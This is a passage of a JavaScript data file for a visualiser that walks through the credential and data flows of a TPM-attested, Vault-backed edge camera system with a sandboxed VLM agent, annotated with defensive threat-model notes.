/**
 * ui/static/arch-scene.js  v2
 * ===========================
 * Single source of truth for the Tab 3 split-pane architecture visualiser.
 *
 * Structure:
 *   NODES  — architecture diagram nodes (top panel)
 *   EDGES  — architecture diagram edges (top panel)
 *   FLOWS  — 11 flows; each flow has:
 *              • title, shortTitle
 *              • actors: subset of NODES shown as sequence lanes
 *              • subSteps: ordered list of messages; each sub-step specifies
 *                  - the sequence row to reveal (from, to, label, arrow kind)
 *                  - the architecture nodes + edges to highlight (top panel)
 *                  - an optional note (shown as a sequence note block)
 *                  - evidence label + narration text
 *
 * ALL facts come from:
 *   architecture.mmd and credential-flow.mmd (as-built 2026-10-19; both files
 *     were deleted in Session 7-1, they remain in the git history of the private repo)
 *   THREAT_MODEL.md
 *
 * No network requests. No external dependencies.
 */

'use strict';

// ─── Canvas ──────────────────────────────────────────────────────────────────
const SCENE_W = 1600;
const SCENE_H = 620;   // top panel height (architecture overview)

// ─── Trust-zone lane bands (left-to-right) ───────────────────────────────────
const LANES = [
  { id: 'edge',    label: 'Physical Edge',              x: 0,    w: 210,  fill: '#0a1520', stroke: '#58A6FF' },
  { id: 'sandbox', label: 'Untrusted Sandbox',          x: 210,  w: 220,  fill: '#1a0808', stroke: '#F85149' },
  { id: 'host',    label: 'Jetson — Trusted Host',      x: 430,  w: 560,  fill: '#081208', stroke: '#76B900' },
  { id: 'mac',     label: 'Mac — Vault & PostgreSQL',   x: 990,  w: 610,  fill: '#16140a', stroke: '#FFD814' },
];

// ─── Nodes ────────────────────────────────────────────────────────────────────
// x,y = centre; w,h = box size
const NODES = [
  // Physical Edge
  { id: 'CAM',    label: 'RTSP\nCamera',           glyph: '📷', lane: 'edge',    x: 105,  y: 160, w: 150, h: 62, trust: 'edge',
    holds: 'Live video (RTSP :554, auth-protected)', notHolds: '' },
  { id: 'TPM',    label: 'Hardware\nTPM 2.0',       glyph: '🔐', lane: 'edge',    x: 105,  y: 310, w: 150, h: 62, trust: 'hardware',
    holds: 'Endorsement Key — private key never leaves chip', notHolds: '' },
  { id: 'THREAT', label: 'Attacker\n(sandbox code)',glyph: '☠',  lane: 'edge',    x: 105,  y: 545, w: 150, h: 56, trust: 'threat',
    holds: 'Runs as uid 1000; can attempt connect()', notHolds: '' },

  // Sandbox
  { id: 'AG',     label: 'agent.py\n(sandbox)',     glyph: '🤖', lane: 'sandbox', x: 320,  y: 350, w: 170, h: 74, trust: 'untrusted',
    holds: 'Opaque INGEST_KEY placeholder · plaintext frames · VLM text', notHolds: '' },

  // Trusted Host
  { id: 'VA1',    label: 'vault-agent\n(edge role)',    glyph: '🛡', lane: 'host', x: 515,  y: 100, w: 155, h: 64, trust: 'trusted',
    holds: 'TPM client cert; edge token → /run/openshell-edge/vault-token (0640 root:edge-ingest)', notHolds: '' },
  { id: 'VA2',    label: 'vault-agent\n(gateway role)', glyph: '🛡', lane: 'host', x: 690,  y: 100, w: 155, h: 64, trust: 'trusted',
    holds: 'TPM client cert; gateway token → /run/openshell/vault-token (0640 root:jetson)', notHolds: '' },
  { id: 'GW',     label: 'OpenShell\nGateway+Supervisor', glyph: '🔒', lane: 'host', x: 875,  y: 100, w: 165, h: 64, trust: 'trusted',
    holds: 'Vault credential driver; providers edge-ingest + cosmos-vlm; injects real key at request time', notHolds: '' },
  { id: 'TE',     label: 'trusted-edge\n:8095',          glyph: '⚡', lane: 'host', x: 605,  y: 340, w: 165, h: 74, trust: 'trusted',
    holds: 'RTSP URL · Transit DEK · dynamic DB cred · key hashes — in process memory only', notHolds: '' },
  { id: 'VLM',    label: 'llama-server\n:8090',           glyph: '🧠', lane: 'host', x: 810,  y: 260, w: 158, h: 62, trust: 'trusted',
    holds: 'Model weights ~2.1 GB Q4_K_M; accepts images → text; swap.max=0 enforced', notHolds: '' },
  { id: 'UI',     label: 'live-vlm-webui\n:8443',         glyph: '🖥',  lane: 'host', x: 605,  y: 490, w: 165, h: 62, trust: 'trusted',
    holds: 'control-reader AppRole role_id+secret_id via LoadCredential=; admin key via LoadCredential=', notHolds: '' },
  { id: 'SUP',    label: 'OS Supervisor\n(per-sandbox)',   glyph: '🚧', lane: 'host', x: 430,  y: 490, w: 140, h: 56, trust: 'trusted',
    holds: 'Injects real key at request time from gateway; enforces network policy', notHolds: '' },

  // Mac
  { id: 'VAULT',  label: 'Vault Enterprise\n:8200 HTTPS',  glyph: '🏦', lane: 'mac',  x: 1145, y: 220, w: 185, h: 70, trust: 'vault',
    holds: 'auth/tpm · auth/approle · Transit · KV-v2 · DB engine', notHolds: '' },
  { id: 'PG',     label: 'PostgreSQL 16\n:5432',           glyph: '🗄', lane: 'mac',  x: 1390, y: 420, w: 165, h: 64, trust: 'vault',
    holds: 'events: encrypted_datakey (vault:v1:) + AES-GCM raw_payload; no plaintext', notHolds: '' },
];

// ─── Edges ────────────────────────────────────────────────────────────────────
// kind: 'credential'|'data'|'denied'|'admin'
const EDGES = [
  { id: 'e-tpm-vault', from:'TPM',   to:'VAULT', kind:'credential', label:'EK enrolled (one-time)',     curve: -120, dash: '5,4' },
  { id: 'e-tpm-va1',   from:'VA1',   to:'TPM',   kind:'credential', label:'TPM attest → edge token',    curve: -80 },
  { id: 'e-tpm-va2',   from:'VA2',   to:'TPM',   kind:'credential', label:'TPM attest → gateway token', curve: -80 },
  { id: 'e-va1-vault', from:'VA1',   to:'VAULT', kind:'credential', label:'edge token (1h)' },
  { id: 'e-va2-vault', from:'VA2',   to:'VAULT', kind:'credential', label:'gateway token (1h)' },
  { id: 'e-va1-te',    from:'VA1',   to:'TE',    kind:'credential', label:'token file (tmpfs)', curve: -80 },
  { id: 'e-va2-gw',    from:'VA2',   to:'GW',    kind:'credential', label:'token file (tmpfs)' },
  { id: 'e-te-vault',  from:'TE',    to:'VAULT', kind:'credential', label:'trusted-edge ↔ Vault (HTTPS)' },
  { id: 'e-gw-vault',  from:'GW',    to:'VAULT', kind:'credential', label:'provider creds (Vault driver)' },
  { id: 'e-cam-te',    from:'CAM',   to:'TE',    kind:'data',       label:'RTSP (not via sandbox)' },
  { id: 'e-ag-sup',    from:'AG',    to:'SUP',   kind:'data',       label:'sandbox ↔ supervisor (all traffic)' },
  { id: 'e-sup-gw',    from:'SUP',   to:'GW',    kind:'credential', label:'key injection' },
  { id: 'e-sup-te',    from:'SUP',   to:'TE',    kind:'data',       label:'supervisor ↔ trusted-edge' },
  { id: 'e-sup-vlm',   from:'SUP',   to:'VLM',   kind:'data',       label:'POST /v1/chat/completions' },
  { id: 'e-vlm-sup',   from:'VLM',   to:'SUP',   kind:'data',       label:'VLM text response' },
  { id: 'e-te-pg',     from:'TE',    to:'PG',    kind:'data',       label:'trusted-edge ↔ PostgreSQL' },
  { id: 'e-vault-pg',  from:'VAULT', to:'PG',    kind:'credential', label:'CREATE/DROP ROLE' },
  { id: 'e-ui-te',     from:'UI',    to:'TE',    kind:'admin',      label:'GET/POST /admin/*' },
  { id: 'e-ui-vault',  from:'UI',    to:'VAULT', kind:'credential', label:'WebUI ↔ Vault (HTTPS)' },
  { id: 'e-threat-ag', from:'THREAT',to:'AG',    kind:'data',       label:'', dash: '6,3' },
];

// ─── Flows ────────────────────────────────────────────────────────────────────
// Each flow = one block of the former credential-flow.mmd (deleted in Session 7-1).
// Each subStep = one or two messages from that block.
//   archNodes  — node IDs to light up in the top panel
//   archEdges  — edge IDs to light up in the top panel
//   from/to    — participant IDs (keys in PARTICIPANTS below) for the sequence row
//   arrow      — 'solid'|'dashed'|'note'
//   label      — message label in the sequence row
//   note       — optional note text (shown as a Note box in the sequence panel)
//   evidence   — 'verified'|'documented'|'inferred'|'unverified'
//   narration  — 1–2 sentence explanation
// ---------------------------------------------------------------------------

// Participant definitions (shown as columns in the sequence panel)
const PARTICIPANTS = {
  Attacker: { label: 'Attacker\n(compromised code)', color: '#F85149', nodeId: 'THREAT' },
  AG:       { label: 'agent.py\n(sandbox)',           color: '#F85149', nodeId: 'AG' },
  CAM:      { label: 'RTSP\nCamera',                  color: '#58A6FF', nodeId: 'CAM' },
  SUP:      { label: 'OpenShell\nSupervisor',         color: '#76B900', nodeId: 'SUP' },
  GW:       { label: 'OpenShell\nGateway',            color: '#76B900', nodeId: 'GW' },
  TE:       { label: 'trusted-edge\n:8095',           color: '#76B900', nodeId: 'TE' },
  VLM:      { label: 'llama-server\n:8090',           color: '#76B900', nodeId: 'VLM' },
  UI:       { label: 'live-vlm-\nwebui :8443',        color: '#76B900', nodeId: 'UI' },
  VA1:      { label: 'vault-agent\n(edge role)',       color: '#76B900', nodeId: 'VA1' },
  VA2:      { label: 'vault-agent\n(gateway role)',    color: '#76B900', nodeId: 'VA2' },
  TPM:      { label: 'Hardware\nTPM 2.0',             color: '#C084FC', nodeId: 'TPM' },
  V:        { label: 'Vault Enterprise\n:8200',        color: '#FFD814', nodeId: 'VAULT' },
  DB:       { label: 'PostgreSQL 16\n:5432',           color: '#FFD814', nodeId: 'PG' },
};

const FLOWS = [

  // ── Flow 1 ─────────────────────────────────────────────────────────────────
  {
    id: 'f1',
    title: '1. Hardware-Rooted Attestation',
    shortTitle: '1. TPM Attest',
    evidence: 'verified', evidenceRef: '3-5e, 3-5f, 5-1',
    description: 'Every secret on this device is gated by the TPM 2.0 — a firmware-based TPM built into the Orin SoC (fTPM, not a discrete hardware module, but still TPM 2.0 spec-compliant). Before any service can talk to Vault, vault-agent must prove it is running on this specific chip by completing a cryptographic challenge that only the TPM\'s Endorsement Key can answer. The result is two short-lived Vault tokens, each carrying exactly one policy, written to tmpfs files that only the intended process can read. No password, no static credential — hardware identity all the way down.',
    attackerGets: 'Nothing from this step — TPM private key never leaves hardware. Token files are 0640 (T-04: jetson user is root-equivalent, so a compromised host OS defeats this).',
    participants: ['VA1', 'VA2', 'TPM', 'V', 'TE', 'GW'],
    subSteps: [
      {
        // Step 0: Admin pre-enrolment — TPM EK enrolled into Vault (one-time, offline)
        archNodes: ['TPM','VAULT'], archEdges: ['e-tpm-vault'],
        packetEdge: 'e-tpm-vault',
        from:'V', to:'V', arrow:'note',
        label: 'Admin pre-enrolled the TPM EK in Vault (one-time: vault write identity/tpm)',
        narration: 'Before any of this runs, an admin read the Jetson\'s TPM Endorsement Key and registered it in Vault\'s TPM auth method. This is a one-time setup — Vault now knows exactly which hardware chip it trusts.',
        evidence: 'verified',
      },
      {
        // VA1 sends attestation request to TPM — packet travels VA1→TPM (with edge direction)
        archNodes: ['TPM','VA1'], archEdges: ['e-tpm-va1'],
        packetEdge: 'e-tpm-va1',
        from:'VA1', to:'TPM', arrow:'solid',
        label: 'vault tpm attest (unauthenticated — hardware challenge/response)',
        narration: 'vault-agent (edge role) starts the attestation. It contacts the TPM hardware directly — no Vault token needed at this point.',
        evidence: 'verified',
      },
      {
        // TPM responds with signed challenge back to VA1 — reverse of new edge direction
        archNodes: ['TPM','VA1'], archEdges: ['e-tpm-va1'],
        packetReverse: true, packetEdge: 'e-tpm-va1',
        from:'TPM', to:'VA1', arrow:'dashed',
        label: 'EK signs challenge → client cert (hardware-only, no network)',
        narration: 'The TPM\'s Endorsement Key signs the challenge entirely in hardware. vault-agent now holds a client certificate derived from the TPM key — no network call needed, no Vault contact yet.',
        evidence: 'verified',
      },
      {
        // VA1 now authenticates to Vault using the TPM client cert
        archNodes: ['VA1','VAULT'], archEdges: ['e-va1-vault'],
        packetEdge: 'e-va1-vault',
        from:'VA1', to:'V', arrow:'solid',
        label: 'auto_auth method=tpm — role edge-camera-agent',
        narration: 'vault-agent authenticates to Vault using the TPM auth method, requesting the edge-camera-agent role.',
        evidence: 'verified',
      },
      {
        // Vault returns token to VA1 — packet travels Vault→VA1
        archNodes: ['VA1','VAULT'], archEdges: ['e-va1-vault'],
        packetReverse: true, packetEdge: 'e-va1-vault',
        from:'V', to:'VA1', arrow:'dashed',
        label: 'token (1h TTL, policy: edge-ai-demo-policy-edge ONLY)',
        narration: 'Vault returns a 1-hour token carrying ONLY the edge policy — vault-agent can read KV secrets, request a DB credential, and request a Transit datakey. Nothing else.',
        evidence: 'verified',
      },
      {
        // VA1 writes the token to the tmpfs file — packet travels VA1→token file
        archNodes: ['VA1','TE'], archEdges: ['e-va1-te'],
        packetEdge: 'e-va1-te',
        from:'VA1', to:'TE', arrow:'solid',
        label: 'write /run/openshell-edge/vault-token (tmpfs, edge-ingest only)',
        narration: 'vault-agent writes the edge token to a tmpfs file. Only the edge-ingest group can read it — trusted-edge picks it up from there. The token never touches disk.',
        evidence: 'verified',
      },
      {
        // VA2 sends attestation request to TPM — with edge direction
        archNodes: ['TPM','VA2'], archEdges: ['e-tpm-va2'],
        packetEdge: 'e-tpm-va2',
        from:'VA2', to:'TPM', arrow:'solid',
        label: 'vault tpm attest — role openshell-gateway (same TPM)',
        narration: 'vault-agent (gateway role) runs the same TPM attestation — same physical TPM chip, different Vault role.',
        evidence: 'verified',
      },
      {
        // TPM responds to VA2 — reverse of new edge direction
        archNodes: ['TPM','VA2'], archEdges: ['e-tpm-va2'],
        packetReverse: true, packetEdge: 'e-tpm-va2',
        from:'TPM', to:'VA2', arrow:'dashed',
        label: 'EK signs challenge → client cert (gateway role, hardware-only)',
        narration: 'Same hardware operation for the gateway role. The TPM signs the challenge locally — vault-agent now holds a client certificate it will use to authenticate to Vault in the next step.',
        evidence: 'verified',
      },
      {
        // VA2 authenticates to Vault with the TPM client cert
        archNodes: ['VA2','VAULT'], archEdges: ['e-va2-vault'],
        packetEdge: 'e-va2-vault',
        from:'VA2', to:'V', arrow:'solid',
        label: 'auto_auth method=tpm — role openshell-gateway',
        narration: 'vault-agent (gateway role) authenticates to Vault using the TPM auth method, requesting the openshell-gateway role.',
        evidence: 'verified',
      },
      {
        // Vault returns gateway token to VA2
        archNodes: ['VA2','VAULT'], archEdges: ['e-va2-vault'],
        packetReverse: true, packetEdge: 'e-va2-vault',
        from:'V', to:'VA2', arrow:'dashed',
        label: 'token (1h TTL, policy: edge-ai-demo-policy-gateway ONLY)',
        narration: 'Vault returns a 1-hour token for the gateway role only. Each token carries exactly one policy — least privilege by hardware attestation.',
        evidence: 'verified',
      },
      {
        // VA2 writes the gateway token to the tmpfs file → OpenShell Gateway reads it
        archNodes: ['VA2','GW'], archEdges: ['e-va2-gw'],
        packetEdge: 'e-va2-gw',
        from:'VA2', to:'GW', arrow:'solid',
        label: 'write /run/openshell/vault-token (tmpfs, jetson group only)',
        narration: 'vault-agent writes the gateway token to a tmpfs file. The OpenShell gateway reads it — this is the credential the Vault driver uses to fetch provider secrets.',
        evidence: 'verified',
      },
    ],
  },

  // ── Flow 2 ─────────────────────────────────────────────────────────────────
  {
    id: 'f2',
    title: '2. trusted-edge Startup — Fetch All Secrets',
    shortTitle: '2. TE Startup',
    evidence: 'verified', evidenceRef: '3-5g, 5-2, 5-3b',
    description: 'trusted-edge is the only process on the device that ever holds plaintext secrets. At startup it makes three sequential round-trips to Vault — fetching the camera RTSP URL, a fresh AES-256 datakey, and a dynamic PostgreSQL credential — each with its own request and response. Nothing is written to disk or logged; all secrets live in process memory only. The dynamic DB credential is valid for just 5 minutes, forcing regular rotation and limiting the blast radius of any leak.',
    attackerGets: 'trusted-edge IS the crown jewel (T-02). Host compromise → all secrets. Mitigation: dedicated user edge-ingest, no shell, no sudo.',
    participants: ['VA1', 'TE', 'V', 'DB'],
    subSteps: [
      {
        // Step 1: VA1 writes token to tmpfs; TE reads it
        archNodes: ['VA1','TE'], archEdges: ['e-va1-te'],
        packetEdge: 'e-va1-te',
        from:'VA1', to:'TE', arrow:'solid',
        label: 'read /run/openshell-edge/vault-token (tmpfs, edge-ingest only)',
        narration: 'trusted-edge starts and reads the edge Vault token written by vault-agent. Only the edge-ingest group can read this file.',
        evidence: 'verified',
      },
      {
        // Step 2: TE → Vault: request KV camera creds
        archNodes: ['TE','VAULT'], archEdges: ['e-te-vault'],
        packetEdge: 'e-te-vault',
        from:'TE', to:'V', arrow:'solid',
        edgeLabel: 'KV-v2: camera URL',
        label: 'GET kv/edge-device/camera-creds (rtsp_url)',
        narration: 'trusted-edge fetches the RTSP camera URL from Vault KV-v2.',
        evidence: 'verified',
      },
      {
        // Step 3: Vault → TE: respond with KV value
        archNodes: ['TE','VAULT'], archEdges: ['e-te-vault'],
        packetReverse: true, packetEdge: 'e-te-vault',
        from:'V', to:'TE', arrow:'dashed',
        edgeLabel: 'KV-v2: camera URL',
        label: '{ rtsp_url } — stored in process memory only',
        narration: 'Vault returns the RTSP URL. It is stored in trusted-edge process memory — never written to disk.',
        evidence: 'verified',
      },
      {
        // Step 4: TE → Vault: request Transit datakey
        archNodes: ['TE','VAULT'], archEdges: ['e-te-vault'],
        packetEdge: 'e-te-vault',
        from:'TE', to:'V', arrow:'solid',
        edgeLabel: 'Transit: new datakey',
        label: 'POST transit/datakey/plaintext/edge-telemetry',
        narration: 'trusted-edge requests a fresh AES-256-GCM datakey from Vault Transit.',
        evidence: 'verified',
      },
      {
        // Step 5: Vault → TE: respond with Transit DEK
        archNodes: ['TE','VAULT'], archEdges: ['e-te-vault'],
        packetReverse: true, packetEdge: 'e-te-vault',
        from:'V', to:'TE', arrow:'dashed',
        edgeLabel: 'Transit: new datakey',
        label: '{ plaintext DEK, ciphertext DEK (vault:v1:…) } — DEK in memory only',
        narration: 'Vault returns the plaintext DEK (held in memory) and the Transit-wrapped ciphertext (stored alongside each event row in PostgreSQL).',
        evidence: 'verified',
      },
      {
        // Step 6: TE → Vault: request dynamic DB credential
        archNodes: ['TE','VAULT'], archEdges: ['e-te-vault'],
        packetEdge: 'e-te-vault',
        from:'TE', to:'V', arrow:'solid',
        edgeLabel: 'DB engine: new credential',
        label: 'GET edge-ai-demo-database/creds/edge-camera-agent',
        narration: 'trusted-edge requests a dynamic PostgreSQL credential. Vault will create a short-lived role valid for 5 minutes.',
        evidence: 'verified',
      },
      {
        // Step 7: Vault → PostgreSQL: CREATE ROLE
        archNodes: ['VAULT','PG'], archEdges: ['e-vault-pg'],
        packetEdge: 'e-vault-pg',
        from:'V', to:'DB', arrow:'solid',
        label: 'CREATE ROLE "v-tpm-edge-…" VALID UNTIL +5m (GRANT ALL PRIVILEGES)',
        narration: 'Vault connects to PostgreSQL and creates the dynamic role. GRANT ALL PRIVILEGES is required due to PostgreSQL 16 column-ACL constraints (AGENTS.md §4).',
        evidence: 'verified',
      },
      {
        // Step 8: PostgreSQL → Vault: confirm role created
        archNodes: ['VAULT','PG'], archEdges: ['e-vault-pg'],
        packetReverse: true, packetEdge: 'e-vault-pg',
        from:'DB', to:'V', arrow:'dashed',
        label: 'CREATE ROLE OK',
        narration: 'PostgreSQL confirms the role was created. Vault now has a valid lease to return to the caller.',
        evidence: 'verified',
      },
      {
        // Step 9: Vault → TE: return DB creds
        archNodes: ['TE','VAULT'], archEdges: ['e-te-vault'],
        packetReverse: true, packetEdge: 'e-te-vault',
        from:'V', to:'TE', arrow:'dashed',
        edgeLabel: 'DB engine: new credential',
        label: '{ username, password, lease_id } — 5 min TTL',
        note: 'RTSP URL · DEK · DB credential · both key hashes held in process memory ONLY. trusted-edge IS the crown jewel.',
        narration: 'All three secrets are now in trusted-edge process memory. Nothing written to disk, nothing logged. The edge token itself is never forwarded.',
        evidence: 'verified',
      },
    ],
  },

  // ── Flow 3 ─────────────────────────────────────────────────────────────────
  {
    id: 'f3',
    title: '3. OpenShell Gateway — Vault Credential Driver',
    shortTitle: '3. GW Driver',
    evidence: 'verified', evidenceRef: '3-5h',
    description: 'The OpenShell gateway never stores credentials locally — it uses Vault as its backend via a built-in credential driver. When the sandbox agent makes a request carrying an opaque placeholder, the gateway fetches the real INGEST_KEY from Vault at that moment and injects it into the outgoing HTTP header. The sandbox process never sees the real key at any point. This means rotating the key requires no restart of the sandbox — only a Vault KV update.',
    attackerGets: 'If the gateway process is compromised, INGEST_KEY is visible in memory. Mitigated by isolated gateway Vault policy (T-10).',
    participants: ['VA2', 'GW', 'V'],
    subSteps: [
      {
        archNodes: ['VA2','GW'], archEdges: ['e-va2-gw'],
        packetEdge: 'e-va2-gw',
        from:'VA2', to:'GW', arrow:'solid',
        label: 'read /run/openshell/vault-token (tmpfs, jetson group only)',
        narration: 'The OpenShell gateway reads its own Vault token written by vault-agent. The gateway token carries only the gateway policy — it cannot read camera-creds or the Transit DEK.',
        evidence: 'verified',
      },
      {
        archNodes: ['GW','VAULT'], archEdges: ['e-gw-vault'],
        packetEdge: 'e-gw-vault',
        from:'GW', to:'V', arrow:'solid',
        label: 'GET edge-ai-demo-gateway/data/openshell/provider-credentials/<sha256-of-INGEST_KEY>',
        narration: 'The Vault credential driver fetches the INGEST_KEY. The gateway local database holds only an opaque handle — Vault holds the actual value.',
        evidence: 'verified',
      },
      {
        archNodes: ['GW','VAULT'], archEdges: ['e-gw-vault'],
        packetReverse: true, packetEdge: 'e-gw-vault',
        from:'V', to:'GW', arrow:'dashed',
        label: 'INGEST_KEY plaintext (fetched at supervisor request time)',
        note: 'Gateway DB holds only the handle. Vault holds the value. The sandbox never sees the real key.',
        narration: 'The real INGEST_KEY is now held in the gateway process only. The sandbox agent holds only an opaque placeholder that the supervisor resolves at runtime.',
        evidence: 'verified',
      },
    ],
  },

  // ── Flow 4 ─────────────────────────────────────────────────────────────────
  {
    id: 'f4',
    title: '4. Sandbox Frame Fetch',
    shortTitle: '4. Frame Fetch',
    evidence: 'verified', evidenceRef: '3-5i',
    description: 'The agent.py process runs inside an OpenShell sandbox with no direct network interface. Every outbound connection must pass through the supervisor, which enforces a strict allowlist of permitted hosts and routes. When the agent fetches a camera frame, it sends an opaque provider placeholder instead of the real ingest key — the supervisor fetches the real key from the gateway, injects it, and forwards to trusted-edge. The agent is structurally prevented from ever learning the real credential.',
    attackerGets: 'Sandbox sees only an opaque placeholder — real key injected by supervisor, never lands in sandbox process (T-08).',
    participants: ['CAM', 'AG', 'SUP', 'GW', 'TE'],
    subSteps: [
      {
        // Step 1: Camera → trusted-edge: RTSP frame captured (how TE has a frame to serve)
        archNodes: ['CAM','TE'], archEdges: ['e-cam-te'],
        packetEdge: 'e-cam-te',
        from:'CAM', to:'TE', arrow:'solid',
        label: 'RTSP stream → trusted-edge captures latest frame (not via sandbox)',
        narration: 'trusted-edge connects directly to the RTSP camera stream and holds the latest frame in memory. The sandbox never touches the camera directly — it requests frames from trusted-edge via the supervisor.',
        evidence: 'verified',
      },
      {
        // Step 2: AG → SUP: request with opaque placeholder
        archNodes: ['AG','SUP'], archEdges: ['e-ag-sup'],
        packetEdge: 'e-ag-sup',
        from:'AG', to:'SUP', arrow:'solid',
        label: 'GET :8095/frame.jpg  X-Edge-Key: openshell:resolve:env:v…_INGEST_KEY',
        note: 'Agent holds ONLY the opaque placeholder — never the real key.',
        narration: 'agent.py sends a GET request with the opaque provider placeholder as the key. The request exits the sandbox only through the OpenShell supervisor — there is no direct network path out.',
        evidence: 'verified',
      },
      {
        // Step 3: SUP → GW: fetch the real key
        archNodes: ['SUP','GW'], archEdges: ['e-sup-gw'],
        packetEdge: 'e-sup-gw',
        from:'SUP', to:'GW', arrow:'solid',
        label: 'resolve openshell:resolve:env:v…_INGEST_KEY → fetch real INGEST_KEY',
        narration: 'The supervisor recognises the provider placeholder and asks the gateway to resolve it. The gateway looks up the real INGEST_KEY from its Vault credential driver cache.',
        evidence: 'verified',
      },
      {
        // Step 4: GW → SUP: return real key
        archNodes: ['SUP','GW'], archEdges: ['e-sup-gw'],
        packetReverse: true, packetEdge: 'e-sup-gw',
        from:'GW', to:'SUP', arrow:'dashed',
        label: 'INGEST_KEY (real value — never leaves the trusted host boundary)',
        narration: 'The gateway returns the real key to the supervisor. At no point is the key sent into the sandbox — the supervisor holds it only long enough to inject it into the outgoing request header.',
        evidence: 'verified',
      },
      {
        // Step 5: SUP → TE: forward with real key injected
        archNodes: ['SUP','TE'], archEdges: ['e-sup-te'],
        packetEdge: 'e-sup-te',
        from:'SUP', to:'TE', arrow:'solid',
        edgeLabel: 'GET (real key injected)',
        label: 'GET /frame.jpg  X-Edge-Key: <real key injected>',
        narration: 'The supervisor forwards the request to trusted-edge with the real key in the header. trusted-edge validates it using a constant-time hash comparison — meaning the comparison takes the same amount of time whether the key is correct or not, preventing timing side-channels that could leak information about how close a guess was.',
        evidence: 'verified',
      },
      {
        // Step 6: TE → SUP: 200 JPEG
        archNodes: ['TE','SUP'], archEdges: ['e-sup-te'],
        packetReverse: true, packetEdge: 'e-sup-te',
        from:'TE', to:'SUP', arrow:'dashed',
        edgeLabel: '200 JPEG response',
        label: '200 JPEG (latest frame from RTSP buffer)',
        narration: 'trusted-edge returns the latest camera frame to the supervisor.',
        evidence: 'verified',
      },
      {
        // Step 7: SUP → AG: deliver frame to sandbox
        archNodes: ['SUP','AG'], archEdges: ['e-ag-sup'],
        packetReverse: true, packetEdge: 'e-ag-sup',
        from:'SUP', to:'AG', arrow:'dashed',
        label: '200 JPEG delivered to sandbox',
        narration: 'The supervisor forwards the frame into the sandbox. agent.py now has the JPEG to send to the VLM — but has never seen the real ingest key.',
        evidence: 'verified',
      },
    ],
  },

  // ── Flow 5 ─────────────────────────────────────────────────────────────────
  {
    id: 'f5',
    title: '5. Sandbox VLM Inference',
    shortTitle: '5. VLM Inference',
    evidence: 'verified', evidenceRef: '3-5i, Stage 5',
    description: 'The agent only calls the VLM when motion is detected — it downsamples each frame to 64×64 grayscale and computes a mean-absolute-difference (MAD) against the previous inferred frame. If MAD is below threshold and the idle timer has not expired, inference is skipped entirely. When it does fire, the request goes through the supervisor like every other sandbox network call (network_mode=none). The cosmos-vlm provider carries no credential, but the supervisor still enforces L7 rules: only POST /v1/chat/completions and GET /health are permitted. VLM output is treated as untrusted text and filtered through a keyword allow-list.',
    attackerGets: 'VLM output is untrusted. agent.py applies a keyword allow-list. If bypassed, attacker can only write whitelisted event_types (T-12).',
    participants: ['AG', 'SUP', 'VLM'],
    subSteps: [
      {
        // Step 1: motion detection gate — in-process, no network
        archNodes: ['AG'], archEdges: [],
        from:'AG', to:'AG', arrow:'note',
        label: 'motion check: MAD of 64×64 grayscale vs baseline — skip if below threshold',
        narration: 'Before calling the VLM, agent.py downsamples the frame to 64×64 grayscale and computes the mean-absolute-difference (MAD) against the last inferred frame. If MAD is below the motion threshold and the idle timer has not fired, inference is skipped — the VLM is never called for a static scene.',
        evidence: 'verified',
      },
      {
        // Step 2: AG → SUP: POST to VLM (motion confirmed, network_mode=none routes via supervisor)
        archNodes: ['AG','SUP'], archEdges: ['e-ag-sup'],
        packetEdge: 'e-ag-sup',
        from:'AG', to:'SUP', arrow:'solid',
        label: 'POST :8090/v1/chat/completions  (motion detected — image as data: URI, no credential)',
        narration: 'Motion confirmed. agent.py calls requests.post(VLM_URL) with no special proxy config — but because the sandbox has network_mode=none, every TCP connection physically lands on the supervisor\'s transparent proxy. There is no direct path to the VLM.',
        evidence: 'verified',
      },
      {
        // Step 3: SUP enforces cosmos-vlm L7 rules, then forwards to VLM
        archNodes: ['SUP','VLM'], archEdges: ['e-sup-vlm'],
        packetEdge: 'e-sup-vlm',
        from:'SUP', to:'VLM', arrow:'solid',
        label: 'POST /v1/chat/completions  (cosmos-vlm provider: path enforced, no credential injected)',
        narration: 'The supervisor matches the cosmos-vlm provider rule and confirms the path is POST /v1/chat/completions. Any other path or method would be denied here. No key is injected — the VLM has no authentication.',
        evidence: 'verified',
      },
      {
        // Step 4: VLM → SUP: text response (2–4 s inference)
        archNodes: ['VLM','SUP'], archEdges: ['e-vlm-sup'],
        packetEdge: 'e-vlm-sup',
        from:'VLM', to:'SUP', arrow:'dashed',
        label: 'VLM text response — scene description (2–4 s inference on Orin Nano Q4_K_M)',
        narration: 'llama-server returns the scene description after 2–4 seconds of inference. The response travels back through the supervisor to the sandbox.',
        evidence: 'verified',
      },
      {
        // Step 5: SUP → AG: deliver response, agent applies keyword allow-list
        archNodes: ['SUP','AG'], archEdges: ['e-ag-sup'],
        packetReverse: true, packetEdge: 'e-ag-sup',
        from:'SUP', to:'AG', arrow:'dashed',
        label: 'VLM text delivered to sandbox — keyword allow-list applied before event construction',
        note: 'VLM output is untrusted. agent.py applies a keyword allow-list — even a prompt-injection attack can only produce whitelisted event_types (T-12).',
        narration: 'The supervisor delivers the response into the sandbox. agent.py scans the text for keywords from the camera profile (e.g. "person", "gate", "package") and discards anything not on the allow-list before constructing an event to POST.',
        evidence: 'verified',
      },
    ],
  },

  // ── Flow 6 ─────────────────────────────────────────────────────────────────
  {
    id: 'f6',
    title: '6. Sandbox Event Write',
    shortTitle: '6. Event Write',
    evidence: 'verified', evidenceRef: '5-2, 5-3b',
    description: 'When the agent posts a parsed event, trusted-edge validates it, encrypts the payload with an AES-256-GCM datakey, and stores only ciphertext in PostgreSQL — alongside the Transit-wrapped form of the key. Even if someone exfiltrates the database, they get encrypted blobs; decryption requires Vault\'s Transit engine, which never persists the plaintext key anywhere on disk. The encryption and DB write happen entirely within the trusted host boundary, invisible to the sandbox.',
    attackerGets: 'PostgreSQL holds only ciphertext. Without the Transit DEK (held by Vault), the data is unreadable (T-16, T-17).',
    participants: ['AG', 'SUP', 'TE', 'DB'],
    subSteps: [
      {
        // Step 1: AG → SUP: POST with opaque placeholder key
        archNodes: ['AG','SUP'], archEdges: ['e-ag-sup'],
        packetEdge: 'e-ag-sup',
        from:'AG', to:'SUP', arrow:'solid',
        label: 'POST /events  X-Edge-Key: openshell:resolve:env:… (placeholder)',
        narration: 'agent.py POSTs the parsed event with the opaque provider placeholder. The supervisor intercepts the request — it will inject the real key before forwarding.',
        evidence: 'verified',
      },
      {
        // Step 2: SUP → TE: forward with real key injected
        archNodes: ['SUP','TE'], archEdges: ['e-sup-te'],
        packetEdge: 'e-sup-te',
        from:'SUP', to:'TE', arrow:'solid',
